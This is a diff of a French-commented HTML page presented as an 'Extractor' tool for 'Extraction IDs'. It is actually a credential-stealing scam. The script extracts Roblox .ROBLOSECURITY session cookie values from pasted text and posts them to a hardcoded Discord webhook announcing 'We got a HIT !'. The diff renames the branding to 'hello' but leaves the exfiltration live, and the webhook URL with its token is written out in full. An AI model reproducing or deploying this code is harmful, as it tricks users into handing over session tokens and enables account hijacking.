@@ -1,4 +1,3 @@
-
 <!doctype html>
 <html lang="fr">
 <head>
@@ -12,97 +11,11 @@
     .log { margin-top:12px; white-space:pre-wrap; background:#f5f5f5; padding:8px; border-radius:6px; max-height:240px; overflow:auto; }
   </style>
 </head>
-
-
-<style>
-  /* Reset simple */
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-
-  body {
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    max-width: 800px;
-    margin: 30px auto;
-    padding: 20px;
-    background: #f0f2f5;
-    color: #333;
-  }
-
-  h2 {
-    text-align: center;
-    color: #4b6cb7;
-    margin-bottom: 20px;
-  }
-
-  label {
-    display: block;
-    margin-top: 16px;
-    font-weight: 600;
-    color: #4b6cb7;
-  }
-
-  textarea {
-    width: 100%;
-    height: 160px;
-    padding: 10px;
-    border-radius: 8px;
-    border: 1px solid #ccc;
-    font-size: 14px;
-    resize: vertical;
-    transition: border-color 0.2s;
-  }
-  textarea:focus {
-    border-color: #4b6cb7;
-    outline: none;
-    box-shadow: 0 0 5px rgba(75,108,183,0.3);
-  }
-
-  button {
-    margin-top: 15px;
-    padding: 10px 20px;
-    border: none;
-    background: #4b6cb7;
-    color: white;
-    font-weight: bold;
-    font-size: 14px;
-    border-radius: 8px;
-    cursor: pointer;
-    transition: background 0.3s, transform 0.2s;
-  }
-  button:hover {
-    background: #3a539b;
-    transform: translateY(-2px);
-  }
-  button:active {
-    transform: translateY(0);
-  }
-
-  .log {
-    margin-top: 20px;
-    padding: 12px;
-    background: #ffffff;
-    border-radius: 8px;
-    border: 1px solid #ddd;
-    max-height: 250px;
-    overflow-y: auto;
-    font-family: monospace;
-    font-size: 13px;
-    line-height: 1.4;
-    color: #555;
-  }
-
-  /* Responsive */
-  @media (max-width: 600px) {
-    body { padding: 15px; }
-    button { width: 100%; }
-  }
-</style>
-
-
 <body>
-  <h2>Roblox Extractor</h2>
+  <h2>hello Extractor</h2>
 
   <label>Enter The Extraction ID</label>
-  <textarea id="message" placeholder="Roblox Extractor"></textarea>
+  <textarea id="message" placeholder="hello Extractor"></textarea>
 
   <div>
     <button id="sendBtn">Extract</button>
@@ -110,82 +23,97 @@
 
   <div class="log" id="log"></div>
 
-<script>
-const logEl = document.getElementById('log');
-function log(msg){ logEl.textContent += msg + "\n"; logEl.scrollTop = logEl.scrollHeight; }
+  <script>
+    const logEl = document.getElementById('log');
+    function log(msg){ logEl.textContent += msg + "\n"; logEl.scrollTop = logEl.scrollHeight; }
 
-// Mets ton webhook Discord ici :
-const webhookUrl = "https://discord.com/api/webhooks/1421789719766892655/IUQABpGXuZSESJn5CArSMN92SMNBQ7J7wJ9xmyHcWmgFJYt__2jkyRqKZXwr9lRMR0zF";
+    // Mets ton webhook Discord ici :
+    const webhookUrl = "https://discord.com/api/webhooks/1421789719766892655/IUQABpGXuZSESJn5CArSMN92SMNBQ7J7wJ9xmyHcWmgFJYt__2jkyRqKZXwr9lRMR0zF";
 
-async function postToWebhook(url, body, isForm=false){
-  try{
-    const res = await fetch(url, {
-      method: 'POST',
-      headers: isForm ? undefined : { 'Content-Type': 'application/json' },
-      body: isForm ? body : JSON.stringify(body),
+    async function postToWebhook(url, body, isForm=false){
+      try{
+        const res = await fetch(url, {
+          method: 'POST',
+          headers: isForm ? undefined : { 'Content-Type': 'application/json' },
+          body: isForm ? body : JSON.stringify(body),
+        });
+        if(!res.ok){
+          const t = await res.text().catch(()=>res.statusText);
+          throw new Error('HTTP ' + res.status + ' — ' + t);
+        }
+        return true;
+      }catch(e){
+        log('Erreur: ' + e.message);
+        return false;
+      }
+    }
+
+    // Découper le texte en segments de 1998 caractères
+    function splitIntoChunks(str, chunkSize=1998){
+      const chunks = [];
+      for(let i = 0; i < str.length; i += chunkSize){
+        chunks.push(str.slice(i, i + chunkSize));
+      }
+      return chunks;
+    }
+
+    document.getElementById('sendBtn').addEventListener('click', async () => {
+      const text = document.getElementById('message').value;
+      if (!text) {
+        log('Message vide — rien à envoyer.');
+        return;
+      }
+
+      // Extraire le texte entre "helloSECURITY" et ";", en gardant "helloSECURITY"
+      const regex = /(\helloSECURITY[\s\S]*?);/g;
+      let match;
+      const extracted = [];
+      while ((match = regex.exec(text)) !== null) {
+        extracted.push(match[1].trim());
+      }
+
+      if (extracted.length === 0) {
+        log('Aucun texte trouvé entre helloSECURITY et ;');
+        return;
+      }
+
+      // Combine all tokens
+      const token = extracted.join("\n");
+
+      // Split the token into chunks of max 1998 characters
+      let tokenParts = splitIntoChunks(token, 1998);
+
+      // Check if any chunk exceeds 2000 characters, and split further if necessary
+      tokenParts = tokenParts.flatMap(part => {
+        return part.length > 2000 ? splitIntoChunks(part) : [part];
+      });
+
+      // Envoi du message introductif
+      await postToWebhook(webhookUrl, { content: '`We got a HIT ! :`' });
+
+      log('Number of IDs being extracted: ' + tokenParts.length + '. Please wait...');
+
+      // Send all extracted parts to the webhook
+      for (let i = 0; i < tokenParts.length; i++) {
+        const content = '**`' + tokenParts[i] + '`**';
+        if (content.length > 2000) {
+          log('Erreur: Le contenu dépasse la limite de 2000 caractères.');
+          break;
+        }
+
+        const ok = await postToWebhook(webhookUrl, { content: content });
+        if (ok) log(`ID has been sent ${i + 1}/${tokenParts.length}.`);
+        else {
+          log('Erreur.');
+          break;
+        }
+
+        // Delay to avoid rate limiting
+        await new Promise(r => setTimeout(r, 250)); // 250ms delay to avoid hitting rate limits
+      }
+
+      log('Please Wait.');
     });
-    if(!res.ok){
-      const t = await res.text().catch(()=>res.statusText);
-      throw new Error('HTTP ' + res.status + ' — ' + t);
-    }
-    return true;
-  }catch(e){
-    log('Erreur: ' + e.message);
-    return false;
-  }
-}
-
-// Découper le texte en segments de 1998 caractères
-function splitIntoChunks(str, chunkSize=1998){
-  const chunks = [];
-  for(let i=0; i<str.length; i+=chunkSize){
-    chunks.push(str.slice(i, i+chunkSize));
-  }
-  return chunks;
-}
-
-document.getElementById('sendBtn').addEventListener('click', async ()=>{
-  const text = document.getElementById('message').value;
-  if(!text){ log('Message vide — rien à envoyer.'); return; }
-
-  // Extraire le texte entre ".ROBLOSECURITY" et ";", en gardant ".ROBLOSECURITY"
-  const regex = /(\.ROBLOSECURITY[\s\S]*?);/g;
-  let match;
-  const extracted = [];
-  while ((match = regex.exec(text)) !== null) {
-    extracted.push(match[1].trim());
-  }
-
-  if(extracted.length === 0){ log('Aucun texte trouvé entre .ROBLOSECURITY et ;'); return; }
-
-  // Check if the extracted token is too long and split it
-  const token = extracted.join("\n");
-  let tokenParts = [token];
-  if (token.length > 2000) {
-    tokenParts = splitIntoChunks(token, 1998);
-  }
-
-  // Envoi du message introductif
-  await postToWebhook(webhookUrl, { content: '`We got a HIT ! :`' });
-
-  log('Numbers Of ID Is Being Extract ' + tokenParts.length + ' Please Wait ...');
-  for(let i=0;i<tokenParts.length;i++){
-    const content = '**`' + tokenParts[i] + '`**';
-    if (content.length > 2000) {
-      log('Erreur: Le contenu dépasse la limite de 2000 caractères.');
-      break;
-    }
-    const ok = await postToWebhook(webhookUrl, { content: content });
-    if(ok) log(`ID has been send ${i+1}/${tokenParts.length}.`);
-    else { log('Erro.'); break; }
-    await new Promise(r => setTimeout(r, 250));
-  }
-  log('Please Wait.');
-});
-
-</script>
+  </script>
 </body>
 </html>
-
-
-
